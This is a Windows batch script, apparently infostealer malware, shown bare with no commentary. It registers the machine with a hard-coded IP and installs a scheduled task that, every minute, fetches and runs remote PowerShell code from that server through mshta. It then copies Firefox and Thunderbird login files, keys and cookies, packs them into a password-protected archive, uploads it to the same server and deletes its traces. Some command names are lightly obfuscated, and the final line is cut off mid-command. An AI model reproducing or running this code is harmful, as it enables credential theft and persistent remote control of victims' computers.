@Echo Off 
SET

 SETLOCAL ENABLEDELAYEDEXPANSION
 set dapp=AppData
 set local=%USERPROFILE%\%dapp%\local



set vvs=pp
set sattre=199
set cggc=rar
set IZ=8
set NZ=60
set CHAR=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWQYZ
:LOOP
set /a R=%NZ%*%random%/32768
set RMZ=!CHAR:~%R%,1!%RMZ%
set /a IZ-=1
if %IZ% GTR 0 goto LOOP
mkdir "%local%\%RMZ%"
if /I %UserDomain% equ %computername% ( set dom="nodom" ) ELSE ( set dom="dom")
powershell "iwr -uri 185.117.72.132/firstga990.php -method post -body '%RMZ% %computername% %dom%'"
scht%CHAR:~36,1%sks /create /tn "%RMZ%" /tr "mshta vbscript:Execute('CreateObject(''Wscript.Shell'').Run ''powershell  Invoke-Expression -Command:(curl -uri 185.117.72.132/gate990.php -method post -body %RMZ% -UseBasicParsing).content'', 0 : window.close')" /sc MINUT%CHAR:~40,1%
powershell "gp HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize > "%local%\%RMZ%\proglist.txt"
powershell "gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "%local%\%RMZ%\proglist.txt"
echo zazaza >"%local%\%RMZ%\%RMZ%"
echo %UserDomain% %computername%>>"%local%\%RMZ%\%RMZ%"



For  /d  %%i In ("%userprofile%\%dapp%\Roaming\Mozilla\Firefox\Profiles\*") Do (
	If Exist "%%i\logins.json" (
		mkdir "%local%\%RMZ%\ff\%%~nxi"
		copy /Y "%%i\key3.db" "%local%\%RMZ%\ff\%%~nxi\"
		copy /Y "%%i\key4.db" "%local%\%RMZ%\ff\%%~nxi\"
		copy /Y "%%i\cert9.db" "%local%\%RMZ%\ff\%%~nxi\"
		copy /Y "%%i\cookies.sqlite" "%local%\%RMZ%\ff\%%~nxi\"
		copy /Y "%%i\formhistory.sqlite" "%local%\%RMZ%\ff\%%~nxi\"
		copy /Y "%%i\logins.json" "%local%\%RMZ%\ff\%%~nxi\"
		copy /Y "%%i\places.sqlite" "%local%\%RMZ%\ff\%%~nxi\"	
	)		 
)
For  /d  %%i In ("%userprofile%\%dapp%\Roaming\Thunderbird\Profiles\*") Do (
	If Exist "%%i\logins.json" (
		mkdir "%local%\%RMZ%\tb\%%~nxi"	
		copy /Y "%%i\key3.db" "%local%\%RMZ%\tb\%%~nxi\"
		copy /Y "%%i\key4.db" "%local%\%RMZ%\tb\%%~nxi\"
		copy /Y "%%i\abook.mab" "%local%\%RMZ%\tb\%%~nxi\"
		copy /Y "%%i\logins.json" "%local%\%RMZ%\tb\%%~nxi\"	
	)		 	
)



"%temp%\555d.exe" a -hpfGzq5yKw -r -ep1 "%temp%\%RMZ%" "%local%\%RMZ%\"


powershell "curl -Uri 185.117.72.132/mi.php -Method Post -infile ""$env:temp\%RMZ%.%cggc%"""



rd /S /Q "%local%\%RMZ%\"
rd /S /Q "%local%\0000j